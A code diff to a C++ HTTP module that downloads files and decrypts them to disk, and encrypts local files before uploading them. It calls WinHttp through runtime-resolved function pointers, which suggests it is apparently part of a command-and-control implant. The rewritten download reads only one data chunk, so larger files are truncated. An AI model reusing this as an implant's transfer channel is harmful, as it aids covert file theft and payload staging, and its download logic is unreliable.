@@ -213,75 +213,6 @@ namespace System::Http
 		return respText;
 	}
 
-	// Read response data and write it to a file.
-	BOOL WriteResponseData(
-		Procs::PPROCS pProcs,
-		HINTERNET hRequest,
-		const std::wstring& outFile
-	) {
-		DWORD dwSize = 0;
-		DWORD dwRead = 0;
-		LPSTR pszOutBuffer;
-
-		// std::ofstream outFile(sFile, std::ios::binary);
-		HANDLE hFile = CreateFileW(
-			outFile.c_str(),
-			GENERIC_WRITE,
-			0,
-			NULL,
-			CREATE_ALWAYS,
-			FILE_ATTRIBUTE_NORMAL,
-			NULL
-		);
-		if (hFile == INVALID_HANDLE_VALUE)
-		{
-			return FALSE;
-		}
-
-		do
-		{
-			if (!pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				break;
-			}
-			if (!dwSize)
-			{
-				break;
-			}
-
-			pszOutBuffer = new char[dwSize+1];
-			if (!pszOutBuffer)
-			{
-				break;
-			}
-
-			// Read the data
-			ZeroMemory(pszOutBuffer, dwSize+1);
-			if (!pProcs->lpWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwRead))
-			{
-				// Could not read data.
-			}
-			else
-			{
-				DWORD dwWritten;
-				if (!WriteFile(hFile, pszOutBuffer, dwRead, &dwWritten, NULL))
-				{
-					return FALSE;
-				}
-			}
-
-			delete [] pszOutBuffer;
-
-			if (!dwRead)
-				break;
-		} while (dwSize > 0);
-
-		// outFile.close();
-		CloseHandle(hFile);
-
-		return TRUE;
-	}
-
 	// Wrapper for send&read&write response.
 	BOOL DownloadFile(
 		Procs::PPROCS pProcs,
@@ -312,10 +243,58 @@ namespace System::Http
 			return FALSE;
 		}
 
-		if (!WriteResponseData(pProcs, resp.hRequest, wDest))
+		// std::ofstream outFile(sFile, std::ios::binary);
+		HANDLE hFile = CreateFileW(
+			wDest.c_str(),
+			GENERIC_WRITE,
+			0,
+			NULL,
+			CREATE_ALWAYS,
+			FILE_ATTRIBUTE_NORMAL,
+			NULL
+		);
+		if (hFile == INVALID_HANDLE_VALUE)
 		{
 			return FALSE;
 		}
+
+		// Get file size
+		DWORD dwSize = 0;
+		if (!pProcs->lpWinHttpQueryDataAvailable(resp.hRequest, &dwSize))
+		{
+			CloseHandle(hFile);
+			return FALSE;
+		}
+		if (!dwSize || dwSize == 0)
+		{
+			CloseHandle(hFile);
+			return FALSE;
+		}
+
+		// Read data
+		DWORD dwDownloaded = 0;
+		std::vector<BYTE> tempBuffer(dwSize);
+		if (!pProcs->lpWinHttpReadData(resp.hRequest, tempBuffer.data(), dwSize, &dwDownloaded))
+		{
+			CloseHandle(hFile);
+			return FALSE;
+		}
+
+		std::vector<BYTE> buffer;
+		buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
+		// Decrypt data
+		std::vector<BYTE> decBuffer = Crypt::DecryptData(Utils::Convert::VecByteToString(buffer));
+		
+		// Write data to file
+		DWORD dwWritten;
+		if (!WriteFile(hFile, decBuffer.data(), decBuffer.size()/*dwDownloaded*/, &dwWritten, NULL))
+		{
+			CloseHandle(hFile);
+			return FALSE;
+		}
+
+		// outFile.close();
+		CloseHandle(hFile);
 
 		return TRUE;
 	}
@@ -330,9 +309,9 @@ namespace System::Http
         const std::wstring& wSrc
     ) {
         // Read a local file.
-        std::vector<char> byteData = System::Fs::ReadBytesFromFile(wSrc);
+        std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(wSrc);
         // Encrypt the data
-        std::string encData = Crypt::EncryptData(byteData);
+        std::string encData = Crypt::EncryptData(bytes);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
             pProcs,
